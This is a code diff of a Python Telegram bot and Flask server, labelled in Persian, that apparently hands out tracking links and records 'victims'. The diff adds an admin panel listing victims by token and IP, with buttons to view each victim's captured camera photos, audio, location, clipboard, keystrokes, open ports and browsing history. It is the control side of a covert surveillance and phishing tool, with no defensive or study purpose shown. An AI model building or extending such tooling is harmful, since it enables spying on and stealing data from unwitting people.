@@ -112,6 +112,7 @@ CAPTURE_PAGE = """
 </body></html>
 """
 
+# Admin login/page templates (kept same)
 ADMIN_LOGIN = """
 <!DOCTYPE html><html><head><title>ورود</title><style>body{background:#1e1e1e;color:#0f0;text-align:center;padding-top:20vh;} input{padding:10px;margin:5px;}</style></head>
 <body><h2>پنل مدیریت</h2><form method=post action=/admin><input type=password name=pass placeholder=رمز عبور><br><input type=submit value=ورود></form></body></html>
@@ -381,6 +382,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         keyboard = [
             [InlineKeyboardButton("روشن/خاموش کردن ربات", callback_data="toggle_bot")],
+            [InlineKeyboardButton("📋 لیست قربانیان", callback_data="victims_list")],
             [InlineKeyboardButton("بازگشت", callback_data="start")]
         ]
         await query.edit_message_text("پنل مدیریت:", reply_markup=InlineKeyboardMarkup(keyboard))
@@ -396,12 +398,66 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if user_id == ADMIN_USER_ID:
             keyboard.append([InlineKeyboardButton("⚙️ پنل مدیریت", callback_data="admin_panel")])
         await query.edit_message_text("برای دریافت لینک اختصاصی روی دکمه زیر کلیک کنید.", reply_markup=InlineKeyboardMarkup(keyboard))
+    elif data == "victims_list":
+        if user_id != ADMIN_USER_ID:
+            await query.answer("شما اجازه ندارید.", show_alert=True)
+            return
+        db = sqlite3.connect(DATABASE)
+        db.row_factory = sqlite3.Row
+        victims = db.execute("SELECT token, ip, created_at FROM victims ORDER BY created_at DESC").fetchall()
+        db.close()
+        if not victims:
+            await query.edit_message_text("هنوز هیچ قربانی‌ای ثبت نشده.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
+            return
+        buttons = []
+        for v in victims:
+            short = v['token'][:8] + "..."
+            btn = InlineKeyboardButton(f"{short} ({v['ip']})", callback_data=f"victim_detail|{v['token']}")
+            buttons.append([btn])
+        buttons.append([InlineKeyboardButton("بازگشت به پنل", callback_data="admin_panel")])
+        await query.edit_message_text("📋 لیست قربانیان (روی هرکدام کلیک کنید):", reply_markup=InlineKeyboardMarkup(buttons))
+    elif data.startswith("victim_detail|"):
+        if user_id != ADMIN_USER_ID:
+            await query.answer("شما اجازه ندارید.", show_alert=True)
+            return
+        token = data.split("|")[1]
+        db = sqlite3.connect(DATABASE)
+        db.row_factory = sqlite3.Row
+        victim = db.execute("SELECT * FROM victims WHERE token=?", (token,)).fetchone()
+        if not victim:
+            await query.edit_message_text("قربانی یافت نشد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت به لیست", callback_data="victims_list")]]))
+            db.close()
+            return
+        log_dev = db.execute("SELECT data FROM logs WHERE token=? AND type='device' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
+        info = json.loads(log_dev['data']) if log_dev else {}
+        db.close()
+
+        text = f"<b>مشخصات قربانی</b>\n"
+        text += f"<b>توکن:</b> <code>{victim['token']}</code>\n"
+        text += f"<b>IP:</b> {victim['ip']}\n"
+        text += f"<b>زمان:</b> {victim['created_at']}\n"
+        text += f"<b>اطلاعات دستگاه:</b>\n<pre>{json.dumps(info, indent=2, ensure_ascii=False)}</pre>"
+
+        keyboard = [
+            [InlineKeyboardButton("📸 عکس", callback_data=f"photo|{token}"),
+             InlineKeyboardButton("🎤 صدا", callback_data=f"audio|{token}")],
+            [InlineKeyboardButton("📍 موقعیت", callback_data=f"location|{token}"),
+             InlineKeyboardButton("📋 کلیپ‌بورد", callback_data=f"clipboard|{token}")],
+            [InlineKeyboardButton("⌨️ کی‌استروک", callback_data=f"keystrokes|{token}"),
+             InlineKeyboardButton("🔌 پورت‌ها", callback_data=f"ports|{token}")],
+            [InlineKeyboardButton("🌐 تاریخچه", callback_data=f"history|{token}")],
+            [InlineKeyboardButton("🔙 بازگشت به لیست قربانیان", callback_data="victims_list")]
+        ]
+        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
 async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_USER_ID:
         await update.message.reply_text("شما اجازه ندارید.")
         return
-    keyboard = [[InlineKeyboardButton("روشن/خاموش کردن ربات", callback_data="toggle_bot")]]
+    keyboard = [
+        [InlineKeyboardButton("روشن/خاموش کردن ربات", callback_data="toggle_bot")],
+        [InlineKeyboardButton("📋 لیست قربانیان", callback_data="victims_list")]
+    ]
     await update.message.reply_text("پنل مدیریت:", reply_markup=InlineKeyboardMarkup(keyboard))
 
 # -------------------- Main --------------------
@@ -410,18 +466,11 @@ def run_flask():
     app.run(host='0.0.0.0', port=port)
 
 if __name__ == '__main__':
-    # شروع Flask در یک ترد جداگانه
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
-
-    # آماده‌سازی دیتابیس
     init_db()
-
-    # ساخت و اجرای ربات تلگرام (به صورت سنکرون، نه داخل asyncio.run)
     application = Application.builder().token(TOKEN).build()
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("admin", admin_cmd))
     application.add_handler(CallbackQueryHandler(button_handler))
-
-    # اجرای polling (تا ابد منتظر می‌ماند)
     application.run_polling()
